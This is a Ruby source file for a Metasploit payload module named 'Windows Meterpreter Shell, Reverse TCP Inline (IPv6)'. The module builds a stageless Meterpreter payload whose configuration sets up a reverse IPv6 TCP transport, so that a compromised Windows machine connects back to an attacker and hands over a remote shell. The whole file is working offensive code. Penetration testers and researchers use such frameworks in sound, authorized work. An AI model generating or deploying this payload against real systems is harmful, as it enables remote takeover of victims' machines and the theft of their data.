##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/transport_config'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/meterpreter_loader'
require 'msf/base/sessions/meterpreter_x86_win'
require 'msf/base/sessions/meterpreter_options'
require 'rex/payloads/meterpreter/config'

module Metasploit4

  CachedSize = 906910

  include Msf::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Windows::MeterpreterLoader
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows Meterpreter Shell, Reverse TCP Inline (IPv6)',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::Meterpreter_x86_Win
      ))

    register_options([
      OptString.new('EXTENSIONS', [false, "Comma-separate list of extensions to load"]),
      OptInt.new("SCOPEID", [false, "The IPv6 Scope ID, required for link-layer addresses", 0])
    ], self.class)
  end

  def generate
    stage_meterpreter(true) + generate_config
  end

  def generate_config(opts={})
    unless opts[:uuid]
      opts[:uuid] = Msf::Payload::UUID.new({
        :platform => 'windows',
        :arch     => ARCH_X86
      })
    end

    # create the configuration block
    config_opts = {
      :arch       => opts[:uuid].arch,
      :exitfunk   => datastore['EXITFUNC'],
      :expiration => datastore['SessionExpirationTimeout'].to_i,
      :uuid       => opts[:uuid],
      :transports => [transport_config_reverse_ipv6_tcp(opts)],
      :extensions => (datastore['EXTENSIONS'] || '').split(',')
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

end

